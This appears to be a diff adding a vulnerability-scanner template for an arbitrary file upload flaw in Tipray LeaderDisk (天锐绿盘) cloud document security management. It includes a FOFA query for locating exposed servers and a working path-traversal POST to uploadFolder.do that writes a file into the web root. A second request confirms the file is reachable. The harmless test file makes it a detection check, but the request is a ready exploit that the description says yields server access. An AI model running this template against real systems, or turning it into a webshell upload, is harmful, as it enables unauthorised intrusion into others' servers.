@@ -1,0 +1,39 @@
+## id: VEID-2025-0901
+## name: 天锐绿盘云文档安全管理uploadFolder存在文件上传
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2025
+## description: 天锐绿盘云文档安全管理存在任意文件上传漏洞，可以获取服务器权限
+## fofa-query: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+\"lddsm\""
+## verification: true
+
+
+POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm
+
+------WebKitFormBoundaryXqK9dR2yTv7wNpLm
+Content-Disposition: form-data; name="file"; filename="a.txt"
+Content-Type: image/png
+
+hello veil
+------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "json"
+#@ matcher: body contains "true"
+
+---
+
+GET /a.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello veil"
+
+
+
